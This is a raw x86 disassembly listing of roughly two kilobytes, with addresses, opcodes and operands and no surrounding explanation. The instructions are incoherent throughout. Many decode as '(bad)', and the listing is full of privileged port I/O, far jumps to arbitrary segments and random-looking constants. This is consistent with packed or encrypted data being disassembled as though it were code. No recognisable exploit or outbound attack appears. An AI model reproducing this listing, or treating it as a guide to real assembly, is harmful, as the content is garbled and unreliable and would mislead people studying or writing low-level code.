  423cc1:	bound  esp,QWORD PTR [ebx+0x41]
  423cc4:	cs xor ebp,edx
  423cc7:	repz jmp 0x423cad
  423cca:	stos   BYTE PTR es:[edi],al
  423ccb:	fst    QWORD PTR [edi+0x19]
  423cce:	jae    0x423c5c
  423cd0:	rcl    DWORD PTR [ebp-0x722b6209],0x6a
  423cd7:	fiadd  DWORD PTR [esi]
  423cd9:	xchg   ebp,eax
  423cda:	or     ecx,DWORD PTR [ebx]
  423cdc:	xor    edi,ebx
  423cde:	mov    bl,0x44
  423ce0:	jne    0x423cee
  423ce2:	inc    eax
  423ce3:	inc    esi
  423ce4:	sub    BYTE PTR [edx+0x4e18e983],bh
  423cea:	mov    bl,0xb8
  423cec:	je     0x423d4f
  423cee:	adc    ecx,DWORD PTR [esi+0x1d]
  423cf1:	stos   BYTE PTR es:[edi],al
  423cf2:	xchg   BYTE PTR [eax],ch
  423cf4:	inc    edx
  423cf5:	add    BYTE PTR [ebx+0x6d],ah
  423cf8:	(bad)  
  423cf9:	jmp    0x4181792b
  423cfe:	or     esp,esi
  423d00:	lahf   
  423d01:	mov    edx,0x2e398945
  423d06:	sbb    al,0x3b
  423d08:	mov    ebp,0xaa594f92
  423d0d:	pop    edx
  423d0e:	bound  esp,QWORD PTR [edi]
  423d10:	inc    ax
  423d12:	test   ah,dh
  423d14:	push   0xffffff89
  423d16:	dec    esp
  423d17:	loope  0x423d77
  423d19:	inc    ecx
  423d1a:	sub    eax,0x2df63523
  423d1f:	(bad)
  423d22:	hlt    
  423d23:	addr16 mov dh,0x3
  423d26:	adc    BYTE PTR [edx+0x5a],bh
  423d29:	icebp  
  423d2a:	sahf   
  423d2b:	or     eax,0x389fea12
  423d30:	js     0x423d2f
  423d32:	in     eax,dx
  423d33:	imul   edi,esp,0xf
  423d36:	mov    dh,0x36
  423d38:	call   0x4c32:0xc721a831
  423d3f:	inc    ebx
  423d40:	scas   al,BYTE PTR es:[edi]
  423d41:	pop    eax
  423d42:	xchg   ecx,eax
  423d43:	test   bh,dl
  423d45:	pop    ss
  423d46:	inc    eax
  423d47:	mov    eax,ds:0xe0a6ced0
  423d4c:	and    bl,BYTE PTR [eax+0x54348a17]
  423d52:	sti    
  423d53:	or     dl,ah
  423d55:	je     0x423cf9
  423d57:	ret    
  423d58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d59:	into   
  423d5a:	add    dh,BYTE PTR [ecx+0x43]
  423d5d:	ja     0x423d4d
  423d5f:	or     esp,edx
  423d61:	mov    BYTE PTR [edi-0x4c0c1b46],bl
  423d67:	inc    ebx
  423d68:	in     eax,0xf2
  423d6a:	lahf   
  423d6b:	outs   dx,DWORD PTR ds:[esi]
  423d6c:	mov    edi,0x3f6ad09b
  423d71:	xchg   edx,eax
  423d72:	lods   al,BYTE PTR ds:[esi]
  423d73:	fdiv   QWORD PTR ds:0x85b35bf9
  423d79:	(bad)  
  423d7b:	inc    edi
  423d7c:	pop    ebp
  423d7d:	neg    BYTE PTR [ebx]
  423d7f:	dec    esp
  423d80:	sar    BYTE PTR [esi],0xdb
  423d83:	stc    
  423d84:	jmp    0xb98be694
  423d89:	ret    
  423d8a:	sar    BYTE PTR [eax-0x14],1
  423d8d:	cmp    DWORD PTR [edi],ebx
  423d8f:	push   eax
  423d90:	and    DWORD PTR ds:0x8f72c2be,esp
  423d96:	push   0xffffffc4
  423d98:	(bad)  
  423d99:	pop    ecx
  423d9a:	push   esi
  423d9b:	jmp    0x3a3f:0xa981fd67
  423da2:	pushf  
  423da3:	repnz sbb DWORD PTR [ebx],ecx
  423da6:	rol    BYTE PTR [ebp-0x53],cl
  423da9:	inc    ebp
  423daa:	in     al,dx
  423dab:	shr    DWORD PTR [eax],0x41
  423dae:	and    dl,BYTE PTR ds:[edx+0x1]
  423db2:	(bad)  
  423db3:	dec    ecx
  423db4:	mov    dh,BYTE PTR [esi+0x11f7e906]
  423dba:	add    BYTE PTR [eax],al
  423dbc:	ins    BYTE PTR es:[edi],dx
  423dbd:	sub    ch,BYTE PTR [ebx]
  423dbf:	outs   dx,DWORD PTR es:[esi]
  423dc1:	daa    
  423dc2:	ins    DWORD PTR es:[edi],dx
  423dc3:	push   0xfffffff2
  423dc5:	push   esp
  423dc6:	stos   DWORD PTR es:[edi],eax
  423dc7:	adc    ebx,DWORD PTR [esi]
  423dc9:	dec    edi
  423dca:	push   edx
  423dcb:	jns    0x423d91
  423dcd:	mov    bh,0x1
  423dcf:	add    BYTE PTR [esi+0x7f000002],al
  423dd5:	add    cl,dh
  423dd7:	adc    ecx,ebx
  423dd9:	pop    esp
  423dda:	xchg   edx,eax
  423ddb:	outs   dx,BYTE PTR ds:[esi]
  423ddc:	inc    ebp
  423ddd:	pop    ebx
  423dde:	sar    DWORD PTR ds:0x7a1d84ba,0x77
  423de5:	push   ss
  423de6:	popa   
  423de7:	rcl    DWORD PTR [esi+0x19ed3d2c],1
  423ded:	xor    eax,0xa7419a95
  423df2:	mov    ebp,0x5164c77
  423df7:	fnstcw WORD PTR [esi-0x13529eec]
  423dfd:	adc    eax,0x8ab7eb12
  423e02:	retf   
  423e03:	add    al,0x2
  423e05:	sub    DWORD PTR [ebp-0x4],esp
  423e08:	adc    DWORD PTR [ebx-0x55],edx
  423e0b:	mov    dh,0xe3
  423e0d:	pusha  
  423e0e:	add    esp,DWORD PTR [ebx+0x6f0d5c21]
  423e14:	aas    
  423e15:	aam    0xef
  423e17:	push   ecx
  423e18:	es push esp
  423e1a:	out    dx,al
  423e1b:	dec    esi
  423e1c:	lods   al,BYTE PTR ds:[esi]
  423e1d:	fidiv  WORD PTR [edx]
  423e1f:	cmp    eax,0x52736140
  423e24:	shr    BYTE PTR [edx],1
  423e26:	inc    edx
  423e27:	jp     0x423e8a
  423e29:	jbe    0x423db7
  423e2b:	sahf   
  423e2c:	or     al,0x2a
  423e2e:	mov    eax,ds:0xc47fe801
  423e33:	dec    DWORD PTR [edi-0x405b8635]
  423e39:	mov    esp,DWORD PTR [ebx-0x39]
  423e3c:	and    dh,BYTE PTR [edx-0x5e]
  423e3f:	adc    cl,ah
  423e41:	int    0xfb
  423e43:	xor    BYTE PTR [eax-0x182cb615],dl
  423e49:	imul   edi,DWORD PTR [edi+0x3a],0x4f
  423e4d:	mov    eax,ds:0x51d4c951
  423e52:	sub    cl,ch
  423e54:	inc    esp
  423e55:	shl    al,1
  423e57:	jle    0x423df3
  423e59:	out    dx,al
  423e5a:	dec    ebp
  423e5b:	inc    ebp
  423e5c:	xchg   ecx,eax
  423e5d:	adc    eax,0x8eece310
  423e62:	idiv   BYTE PTR [esi+0x65]
  423e65:	shl    DWORD PTR [ebx+ebp*2],1
  423e68:	xchg   ebp,eax
  423e69:	rcl    DWORD PTR [edx-0x825ee55],0xc
  423e70:	fwait
  423e71:	jae    0x423e91
  423e73:	adc    eax,0x1489b333
  423e78:	cmp    eax,DWORD PTR ds:0xe2893dd7
  423e7e:	or     bh,ah
  423e80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e81:	xchg   esp,eax
  423e82:	dec    esi
  423e83:	add    BYTE PTR [edx-0x1],dh
  423e86:	in     al,dx
  423e87:	sbb    DWORD PTR [ebp+0x61],edi
  423e8a:	and    edx,edi
  423e8c:	addr16 loope 0x423e67
  423e8f:	dec    ecx
  423e90:	pushf  
  423e91:	leave  
  423e92:	dec    ebx
  423e93:	imul   ebp,DWORD PTR [ecx+eax*8],0x7e897d31
  423e9a:	pop    edi
  423e9b:	lahf   
  423e9c:	and    BYTE PTR [eax],dl
  423e9e:	shl    BYTE PTR [esi],0x49
  423ea1:	ds cmp al,0x14
  423ea4:	jle    0x423e68
  423ea6:	cmp    BYTE PTR [edi-0x72fe42bc],ch
  423eac:	jno    0x423ebe
  423eae:	xchg   ecx,eax
  423eaf:	push   ds
  423eb0:	add    cl,BYTE PTR [eax]
  423eb2:	mov    ebp,0x9a6b8076
  423eb7:	test   eax,0xaac19568
  423ebc:	inc    edi
  423ebd:	mov    DWORD PTR [ebp-0x7408869c],ebp
  423ec3:	and    eax,0x2231aee5
  423ec8:	sbb    DWORD PTR [edx+edi*1+0x27],eax
  423ecc:	inc    ebx
  423ecd:	mov    ds:0xc0a8748b,eax
  423ed2:	xor    al,0xac
  423ed4:	ins    BYTE PTR es:[edi],dx
  423ed5:	cmp    ebx,DWORD PTR [eax-0x37]
  423ed8:	jge    0x423e71
  423eda:	add    BYTE PTR [ebx-0x2df2ccb4],bl
  423ee0:	(bad)  
  423ee1:	out    dx,eax
  423ee2:	pop    ss
  423ee3:	mov    ch,0xa9
  423ee5:	jne    0x423e69
  423ee7:	push   0x11
  423ee9:	jl     0x423f31
  423eeb:	jne    0x423ea5
  423eed:	enter  0x8085,0x4e
  423ef1:	mov    fs,WORD PTR [edx-0x5a]
  423ef4:	add    bl,ch
  423ef6:	nop
  423ef7:	xor    esp,DWORD PTR [bx+si+0x63]
  423efb:	into   
  423efc:	loopne 0x423e96
  423efe:	cmp    eax,0x8a7a2397
  423f03:	ja     0x423f0a
  423f05:	adc    ebp,edi
  423f07:	aas    
  423f08:	inc    ecx
  423f09:	cwde   
  423f0a:	cmp    esi,ebx
  423f0c:	nop
  423f0d:	out    0x41,al
  423f0f:	pop    ds
  423f10:	loop   0x423f28
  423f12:	push   es
  423f13:	mov    WORD PTR [esp+eiz*8-0x36],es
  423f17:	mov    edx,0x21b5ab9c
  423f1c:	popa   
  423f1d:	pop    ds
  423f1e:	shl    DWORD PTR [ecx-0x3c],0xb
  423f22:	jl     0x423f15
  423f24:	push   eax
  423f25:	shl    ah,1
  423f27:	(bad)  
  423f29:	fld    TBYTE PTR [eax+esi*8+0x12b60aff]
  423f30:	xchg   BYTE PTR [eax+0x73499cbb],bl
  423f36:	loopne 0x423ef5
  423f38:	test   DWORD PTR [eax+esi*1-0x2],ebx
  423f3c:	cmp    eax,0xab81168
  423f41:	pusha  
  423f42:	sub    DWORD PTR [ebp+eax*4+0x31d0e051],0xffffffa8
  423f4a:	push   esp
  423f4b:	test   al,0xc4
  423f4d:	pusha  
  423f4e:	mov    dh,0xc0
  423f50:	ret    
  423f51:	es pop ecx
  423f53:	inc    esp
  423f54:	mov    al,0x1c
  423f56:	fbstp  TBYTE PTR [esi-0x25]
  423f59:	fbld   TBYTE PTR [esi]
  423f5b:	push   cs
  423f5c:	push   ebp
  423f5d:	xor    eax,0xb468cf60
  423f62:	cmp    BYTE PTR [ebx-0x3c],dh
  423f65:	pop    es
  423f66:	jmp    0x541d:0xb19f7199
  423f6d:	and    ebx,ecx
  423f6f:	ss inc edi
  423f71:	icebp  
  423f72:	xchg   esp,eax
  423f73:	or     eax,0x72035275
  423f78:	xchg   ebp,eax
  423f79:	jecxz  0x423f64
  423f7b:	add    ebx,DWORD PTR [ebx-0x39]
  423f7e:	or     eax,0xb39e13e7
  423f83:	lea    ebx,[edi]
  423f85:	fisttp DWORD PTR [ecx-0x6e]
  423f88:	dec    esi
  423f89:	mov    al,cs:0xc98ce165
  423f8f:	or     eax,0xaf817198
  423f94:	rcl    BYTE PTR [edx+ebx*8-0x460e9b70],cl
  423f9b:	aas    
  423f9c:	push   0xeaec622d
  423fa1:	nop
  423fa2:	(bad)  
  423fa3:	nop
  423fa4:	cmc    
  423fa5:	rcl    edx,0x4d
  423fa8:	je     0x423f64
  423faa:	add    BYTE PTR [ebp+0x6b],al
  423fad:	jge    0x423f45
  423faf:	in     eax,0x4f
  423fb1:	nop
  423fb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423fb3:	test   al,0x4e
  423fb5:	adc    al,0xd7
  423fb7:	call   0x6de242e2
  423fbc:	push   edx
  423fbd:	sti    
  423fbe:	xor    eax,0xea0922a7
  423fc3:	retf   0xc63d
  423fc6:	dec    ebx
  423fc7:	stos   BYTE PTR es:[edi],al
  423fc8:	pusha  
  423fc9:	add    cl,bl
  423fcb:	sar    BYTE PTR [ebp+0x57c28471],1
  423fd1:	adc    DWORD PTR ss:[eax-0x61ca32dc],ebx
  423fd8:	push   esi
  423fd9:	pop    ecx
  423fda:	inc    esp
  423fdb:	lea    edi,[eax+0x7d3055b8]
  423fe1:	jle    0x423f85
  423fe3:	fnstsw WORD PTR [ebx]
  423fe5:	mov    BYTE PTR [ebx],dl
  423fe7:	shl    BYTE PTR [ebx+ecx*4-0x65],cl
  423feb:	dec    ebx
  423fec:	sbb    ecx,DWORD PTR [esi+0x36]
  423fef:	cld    
  423ff0:	lock cmc 
  423ff2:	ret    0xe2f4
  423ff5:	mov    eax,0x17d835d0
  423ffa:	sar    dh,cl
  423ffc:	pop    ds
  423ffd:	lods   eax,DWORD PTR ds:[esi]
  423ffe:	in     eax,0xbc
  424000:	loop   0x423fc9
  424002:	fcom   st(6)
  424004:	add    al,0x1c
  424006:	stos   BYTE PTR es:[edi],al
  424007:	fcomp  DWORD PTR ds:0x1bd34e3a
  42400d:	outs   dx,BYTE PTR ds:[esi]
  42400e:	loopne 0x423ffe
  424010:	inc    edx
  424011:	pop    ebp
  424012:	fmul   DWORD PTR [eax-0x1cbd604d]
  424018:	in     al,dx
  424019:	mov    DWORD PTR [ecx+0x6e9f542f],esp
  42401f:	(bad)  
  424020:	sar    DWORD PTR [eax-0x2a],1
  424023:	push   ebx
  424024:	adc    eax,0xb2368c2b
  424029:	jg     0x42404c
  42402b:	out    0x51,eax
  42402d:	iret   
  42402e:	cmp    eax,0x42bcd6a7
  424033:	jge    0x42409f
  424035:	pushf  
  424036:	xor    dh,ch
  424038:	ja     0x42404e
  42403a:	jne    0x424051
  42403c:	mov    edi,0xbd78b58d
  424041:	or     BYTE PTR [edi+edi*4],bh
  424044:	mov    cl,0x6c
  424046:	outs   dx,BYTE PTR ds:[esi]
  424047:	ss ret 0x2046
  42404b:	push   cs
  42404c:	jmp    FWORD PTR [ebx+0x292ee78b]
  424052:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424053:	adc    BYTE PTR [edi+0x40],bh
  424056:	sub    eax,eax
  424058:	std    
  424059:	add    BYTE PTR [bx+si],al
  42405c:	inc    ebx
  42405d:	lea    ebx,[edi]
  42405f:	and    bh,bl
  424061:	mov    dl,0x7f
  424063:	out    dx,eax
  424064:	add    BYTE PTR [ebx-0xddfd8f0],dl
  42406a:	lods   al,BYTE PTR ds:[esi]
  42406b:	nop
  42406c:	dec    edx
  42406d:	mov    edx,0x2860001
  424072:	add    BYTE PTR [eax],al
  424074:	adc    bl,BYTE PTR [ebp+0x13]
  424077:	imul   esi,DWORD PTR [edx+0x76e307c5],0x69
  42407e:	retf   0x4feb
  424081:	loope  0x4240cc
  424083:	fdiv   QWORD PTR [edi-0x3af5b8bd]
  424089:	fcom   QWORD PTR [ecx-0x5a]
  42408c:	retf   0x12c
  42408f:	inc    ecx
  424090:	xor    esi,eax
  424092:	xchg   esi,eax
  424093:	loopne 0x42409a
  424095:	dec    esi
  424096:	push   0x8414900a
  42409b:	leave  
  42409c:	pop    ds
  42409d:	mov    dl,0x6b
  42409f:	fwait
  4240a0:	shr    DWORD PTR [ebx+0x27],cl
  4240a3:	unpckhps xmm2,XMMWORD PTR [eax+0x41]
  4240a7:	repz dec ebx
  4240a9:	ret    0xe6ef
  4240ac:	dec    edx
  4240ad:	sbb    eax,0x50a6c27e
  4240b2:	add    edi,DWORD PTR [ebx+0x32]
  4240b5:	xchg   edi,eax
  4240b6:	repz out dx,al
  4240b8:	aam    0x8a
  4240ba:	dec    eax
  4240bb:	sbb    esp,edi
  4240bd:	push   ecx
  4240be:	pop    DWORD PTR [edx-0x46]
  4240c1:	aad    0x8f
  4240c3:	loope  0x4240df
  4240c5:	jg     0x424143
  4240c7:	sbb    eax,0x3f038ff
  4240cc:	sbb    al,BYTE PTR [edi-0x589b02e1]
  4240d2:	ret    0x5735
  4240d5:	jno    0x4240dc
  4240d7:	sahf   
  4240d8:	cmp    dl,BYTE PTR [ebp-0x46]
  4240db:	xchg   BYTE PTR [ebx+0x53],dl
  4240de:	enter  0x7cc1,0x93
  4240e2:	jmp    0x4240a9
  4240e4:	or     al,0x3b
  4240e6:	sub    DWORD PTR [edi+0x3e7f5b3c],edx
  4240ec:	sti    
  4240ed:	xor    edi,DWORD PTR [esi+0x1b]
  4240f0:	jb     0x424155
  4240f2:	dec    edx
  4240f3:	cmp    al,0x1a
  4240f5:	shl    cl,cl
  4240f7:	ins    DWORD PTR es:[edi],dx
  4240f8:	je     0x4240c3
  4240fa:	adc    eax,DWORD PTR [ebp+esi*2+0x3f34a78c]
  424101:	das    
  424102:	add    BYTE PTR [esi-0x78afceb6],0xaa
  424109:	in     al,dx
  42410a:	aam    0x60
  42410c:	xchg   ebx,eax
  42410d:	push   0x90ccaf84
  424112:	les    ebp,FWORD PTR [ebx-0x25]
  424115:	push   0xffffffe6
  424117:	sbb    bh,bh
  424119:	out    0xeb,eax
  42411b:	in     eax,0x55
  42411d:	sub    ebp,DWORD PTR [eax-0x5a5213f3]
  424123:	js     0x424105
  424125:	jns    0x4240c7
  424127:	push   cs
  424128:	cmp    BYTE PTR [ecx],bl
  42412a:	cmp    BYTE PTR [esi+0x11],0x8e
  42412e:	lock std 
  424130:	add    ebp,DWORD PTR [ecx-0x22]
  424133:	test   DWORD PTR [ebp+eiz*8-0x7],ecx
  424137:	and    bl,cl
  424139:	xchg   ecx,eax
  42413a:	sbb    al,0x37
  42413c:	imul   edx,DWORD PTR [ebp+0x57],0x1fce3a5a
  424143:	aad    0x76
  424145:	je     0x42410a
  424147:	dec    DWORD PTR [eax+0x3a]
  42414a:	daa    
  42414b:	(bad)  
  42414c:	(bad)  [edx+0x997c758]
  424152:	inc    ebx
  424153:	in     eax,dx
  424154:	icebp  
  424155:	cmc    
  424156:	push   0x1f
  424158:	lock call 0x9af89259
  42415e:	mov    gs,WORD PTR [ecx]
  424160:	lock xchg edi,eax
  424162:	aas    
  424163:	mov    BYTE PTR [edx+eiz*8],al
  424166:	cmc    
  424167:	mov    al,0x27
  424169:	into   
  42416a:	xchg   esi,eax
  42416b:	(bad)  
  42416c:	fldcw  WORD PTR [esi-0x22]
  42416f:	dec    esi
  424170:	and    DWORD PTR [edi+ebp*1-0x20ac8034],edx
  424177:	xchg   esi,eax
  424178:	shr    dh,0xec
  42417b:	jge    0x4241f3
  42417d:	gs call 0x66f40699
  424183:	jmp    0x424193
  424185:	push   0xc
  424187:	pushf  
  424188:	fwait
  424189:	inc    edx
  42418a:	adc    al,dl
  42418c:	jnp    0x424162
  42418e:	(bad)  
  42418f:	nop
  424190:	rol    BYTE PTR [ebx-0x6d2702a6],cl
  424196:	enter  0x22c4,0x6
  42419a:	dec    ebx
  42419b:	dec    esi
  42419c:	xchg   esp,eax
  42419d:	pop    eax
  42419e:	pusha  
  42419f:	push   ebx
  4241a0:	sbb    ch,bl
  4241a2:	aaa    
  4241a3:	mov    DWORD PTR [esp+edx*8+0x36],esp
  4241a7:	or     al,0xc9
  4241a9:	fmul   DWORD PTR [ebx+0x24]
  4241ac:	add    BYTE PTR [ebx+0x3c15d11a],bh
  4241b2:	sbb    dl,BYTE PTR [edx-0x61]
  4241b5:	inc    esp
  4241b6:	cli    
  4241b7:	or     eax,esi
  4241b9:	retf   
  4241ba:	and    BYTE PTR [ebp+esi*2+0x424db403],bl
  4241c1:	ret    0x1150
  4241c4:	dec    eax
  4241c5:	sbb    DWORD PTR [ebx-0x24],eax
  4241c8:	fiadd  WORD PTR [ecx]
  4241ca:	shl    BYTE PTR [ebx+ebx*2],0x6b
  4241ce:	ret    0xb935
  4241d1:	pop    ecx
  4241d2:	inc    eax
  4241d3:	pusha  
  4241d4:	frstor [edi-0x75]
  4241d7:	pop    esp
  4241d8:	mov    eax,ds:0x23986550
  4241dd:	(bad)  
  4241de:	fidiv  DWORD PTR [eax+edi*4+0x52]
  4241e2:	leave  
  4241e3:	cld    
  4241e4:	popa   
  4241e5:	sbb    al,0x9
  4241e7:	and    BYTE PTR [ebp+0x6a],dl
  4241ea:	sbb    eax,0x27ad9d1c
  4241ef:	sub    eax,0x7b687f15
  4241f4:	fnstenv [esi+0x1b]
  4241f7:	ins    DWORD PTR es:[edi],dx
  4241f8:	dec    esi
  4241f9:	dec    edx
  4241fa:	mov    WORD PTR [ebx],?
  4241fc:	lods   al,BYTE PTR ds:[esi]
  4241fd:	mov    bl,0x7b
  4241ff:	jp     0x4241eb
  424201:	mov    BYTE PTR [edx],0xd3
  424204:	mov    cl,0xa1
  424206:	pusha  
  424207:	adc    BYTE PTR [ebx],bl
  424209:	es pop edx
  42420b:	(bad)  
  42420c:	into   
  42420d:	jecxz  0x424248
  42420f:	or     dh,BYTE PTR [edx]
  424211:	push   edx
  424212:	loopne 0x4241a3
  424214:	and    DWORD PTR [ecx+0x31],ebx
  424217:	or     BYTE PTR [edi],dh
  424219:	jb     0x4241f5
  42421b:	or     BYTE PTR [edx],0x77
  42421e:	cmp    eax,0xca7d7677
  424223:	or     edi,DWORD PTR ds:0x5650d772
  424229:	mov    ch,0x96
  42422b:	stos   DWORD PTR es:[edi],eax
  42422c:	mov    DWORD PTR [edx+0x1],edi
  42422f:	mov    ebp,0xfdf9d777
  424234:	lods   al,BYTE PTR ds:[esi]
  424235:	pop    edi
  424236:	adc    ch,BYTE PTR [edi]
  424238:	pop    ebp
  424239:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42423a:	fwait
  42423b:	mov    esp,0x5bfa8ddf
  424240:	mov    al,0x97
  424242:	xor    al,0x0
  424244:	adc    bh,BYTE PTR [ecx+0x57fff7f8]
  42424a:	ins    BYTE PTR es:[edi],dx
  42424b:	sbb    eax,0x105b093e
  424250:	ret    
  424251:	mov    bl,0x11
  424253:	mov    ds:0xd0725cb5,eax
  424258:	xchg   edx,eax
  424259:	sub    ebp,DWORD PTR [esi-0x75]
  42425c:	ja     0x4242d1
  42425e:	xor    al,BYTE PTR [ebx-0x4ff4a1db]
  424264:	lock es adc al,0xf7
  424268:	mov    ss,WORD PTR [eax+esi*2-0x1dafc7b]
  42426f:	outs   dx,DWORD PTR ds:[esi]
  424270:	les    eax,FWORD PTR [eax+edi*2-0x48]
  424274:	outs   dx,DWORD PTR ds:[esi]
  424275:	jecxz  0x4241f9
  424277:	xor    al,0x39
  424279:	inc    edx
  42427a:	sub    al,0x13
  42427c:	mov    WORD PTR [esi],cs
  42427e:	pop    esp
  42427f:	push   edx
  424280:	or     bl,dl
  424282:	jnp    0x4242ee
  424284:	je     0x424283
  424286:	(bad)  
  424287:	(bad)  
  424288:	fadd   DWORD PTR [esi+0x247f1d1f]
  42428e:	lods   eax,DWORD PTR ds:[esi]
  42428f:	out    dx,eax
  424290:	cmp    DWORD PTR [ecx-0x2cc1bc82],esp
  424296:	cs add eax,edi
  424299:	sub    BYTE PTR [edi-0x42dd4ecf],ah
  42429f:	and    al,0x2f
  4242a1:	add    DWORD PTR [di-0x59],0x77
  4242a6:	cwde   
  4242a7:	dec    BYTE PTR [edi]
  4242a9:	inc    ebx
  4242aa:	push   0x4b
  4242ac:	mov    DWORD PTR [edi+eax*8-0xa],edi
  4242b0:	gs daa 
  4242b2:	scas   eax,DWORD PTR es:[edi]
  4242b3:	das    
  4242b4:	dec    edi
  4242b5:	(bad)  
  4242b6:	or     al,0xef
  4242b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242b9:	leave  
  4242ba:	pop    ds
  4242bb:	stc    
  4242bc:	push   es
  4242bd:	jne    0x4242d4
  4242bf:	popa   
  4242c0:	test   dl,ah
  4242c2:	add    BYTE PTR [ecx-0x21904cf9],dh
  4242c8:	test   DWORD PTR [edx+ebp*8+0x37],esp
  4242cc:	cmc    
  4242cd:	mov    ds:0xd8fdef72,al
  4242d2:	push   esp
  4242d3:	ss scas al,BYTE PTR es:[edi]
  4242d5:	fcomp  st(7)
  4242d7:	lock das 
  4242d9:	inc    edi
  4242da:	test   BYTE PTR [ebp+0x628137a6],0x83
  4242e1:	mov    cl,0x78
  4242e3:	int    0xe2
  4242e5:	jnp    0x4242ed
  4242e7:	xchg   ebx,eax
  4242e8:	sbb    eax,edx
  4242ea:	mov    ds:0x217f9b5c,eax
  4242ef:	aad    0x53
  4242f1:	bound  ecx,QWORD PTR [ecx+0x1eba5dec]
  4242f7:	pusha  
  4242f8:	or     eax,0xf40000fb
  4242fd:	cmp    DWORD PTR [edx-0x2002081],edx
  424303:	mov    ebx,0xc0721507
  424308:	cmc    
  424309:	or     DWORD PTR [ecx],edx
  42430b:	icebp  
  42430c:	sar    BYTE PTR [ecx+eax*1+0x28600],1
  424313:	add    BYTE PTR [eiz*2+0x2287f16f],bl
  42431a:	mov    ds:0x5b82e859,al
  42431f:	aam    0x66
  424321:	out    dx,eax
  424322:	ss dec esp
  424324:	jmp    0xd7ae:0xfbbf01e6
  42432b:	pop    ebx
  42432c:	fisttp WORD PTR [ecx]
  42432e:	inc    ecx
  42432f:	sub    BYTE PTR [esi-0x39],bh
  424332:	aad    0x19
  424334:	dec    edi
  424335:	inc    esp
  424336:	add    al,0x1d
  424338:	cmp    eax,0xa7337402
  42433d:	add    ah,BYTE PTR [edx-0x58b9a0b8]
  424343:	aam    0x46
  424345:	jmp    0x2aa1ab2e
  42434a:	and    BYTE PTR [edx],dh
  42434c:	ins    BYTE PTR es:[edi],dx
  42434d:	cmp    ch,bh
  42434f:	shl    BYTE PTR [edi],cl
  424351:	lea    esi,[eax]
  424353:	mov    al,ds:0x338dc892
  424358:	mov    ds:0xb5e08e93,eax
  42435d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42435e:	xlat   BYTE PTR ds:[ebx]
  42435f:	cmp    ah,BYTE PTR [ecx-0x3baf4964]
  424365:	xor    DWORD PTR [ebp+0x10],0x84dfc95f
  42436c:	test   BYTE PTR [edx],ah
  42436e:	int3   
  42436f:	mov    dl,0x21
  424371:	inc    edi
  424372:	ss jbe 0x424393
  424375:	mov    ds:0xa1bd9256,eax
  42437a:	and    eax,0x93b6d9af
  42437f:	ret    
  424380:	pop    ds
  424381:	xchg   edx,eax
  424382:	inc    eax
  424383:	stos   BYTE PTR es:[edi],al
  424384:	cmp    dl,BYTE PTR [esi+ecx*2]
  424387:	push   esp
  424388:	xor    eax,0xf8ff58ce
  42438d:	aaa    
  42438e:	pop    ds
  42438f:	inc    edi
  424390:	cmp    DWORD PTR [edi],edi
  424392:	mov    ebx,0xc125a2eb
  424397:	jne    0x42434e
  424399:	fist   WORD PTR [ebx+0x37]
  42439c:	dec    ebp
  42439d:	loop   0x4243df
  42439f:	and    bh,ch
  4243a1:	jp     0x424417
  4243a3:	shl    DWORD PTR [edi-0x34],1
  4243a6:	mov    BYTE PTR [edi+0x1c],ah
  4243a9:	(bad)  
  4243aa:	repnz nop
  4243ac:	or     dh,BYTE PTR [esi-0x1c]
  4243af:	retf   0xaef2
  4243b2:	pop    ebx
  4243b3:	inc    ebp
  4243b4:	aad    0x2d
  4243b6:	rcl    DWORD PTR [esi-0x586b4e4e],1
  4243bc:	int3   
  4243bd:	fadd   QWORD PTR [esi+0x3e]
  4243c0:	add    al,ah
  4243c2:	retf   0x6a00
  4243c5:	stos   BYTE PTR es:[edi],al
  4243c6:	fwait
  4243c7:	aad    0xb3
  4243c9:	xchg   ebp,eax
  4243ca:	lock pop esi
  4243cc:	int3   
  4243cd:	dec    eax
  4243ce:	add    BYTE PTR [ebp+0x5c],cl
  4243d1:	xor    ah,BYTE PTR [eax]
  4243d3:	outs   dx,BYTE PTR ds:[esi]
  4243d4:	test   DWORD PTR [edi],ecx
  4243d6:	xchg   ecx,eax
  4243d7:	bound  esp,QWORD PTR [ecx-0x3a]
  4243da:	lea    ebx,[ecx-0x5e7fb068]
  4243e0:	test   BYTE PTR [ebp+0x4efb129d],dh
  4243e6:	cmp    BYTE PTR [edi+0x48],0x6a
  4243ea:	arpl   WORD PTR [eax+0x1f05cd58],di
  4243f0:	mov    ds:0x67815b97,al
  4243f5:	cmp    al,0x4
  4243f7:	and    al,0x56
  4243f9:	mov    cs:0x383c634e,eax
  4243ff:	jmp    0xebe1:0xa345444c
  424406:	fwait
  424407:	xor    al,0x57
  424409:	das    
  42440a:	ficomp WORD PTR [esi+0x1bb8896a]
  424410:	xor    eax,0xaba56606
  424415:	rcl    esp,0x7d
  424418:	dec    ecx
  424419:	out    0x5b,al
  42441b:	shl    BYTE PTR [edx-0x76],cl
  42441e:	jb     0x424400
  424420:	and    ecx,DWORD PTR [esi-0x40]
  424423:	popf   
  424424:	mov    bh,0x6b
  424426:	test   DWORD PTR [edi],ebx
  424428:	dec    ecx
  424429:	pop    esp
  42442a:	loopne 0x4244a0
  42442c:	xchg   BYTE PTR [esi+0x3931e339],cl
  424432:	das    
  424433:	xor    DWORD PTR [ebx],0x5a
  424436:	pop    ebx
  424437:	out    dx,al
  424438:	cli    
  424439:	rcr    BYTE PTR [ebx],1
  42443b:	push   cs
  42443c:	cmp    edi,DWORD PTR [edi-0x35]
  42443f:	push   0x6d
  424441:	push   ebp
  424442:	pushf  
  424443:	push   esp
  424444:	imul   ecx,DWORD PTR [edx],0xffffffc3
  424447:	loopne 0x424466
  424449:	(bad)  
  42444a:	jl     0x4243f9
  42444c:	add    al,0x63
  42444e:	ficom  DWORD PTR [edi-0x519590b3]
  424454:	sub    al,0x3f
  424456:	mov    ebx,0xb1fbb44a
  42445b:	push   es
  42445c:	out    dx,eax
  42445d:	push   edi
  42445e:	xor    ebp,eax
  424460:	mov    eax,0xddca83bd
  424465:	xor    esi,DWORD PTR [esi-0x14]
  424468:	dec    esp
  424469:	xchg   edx,eax
  42446a:	mov    dh,0xa2
  42446c:	daa    
  42446d:	pop    eax
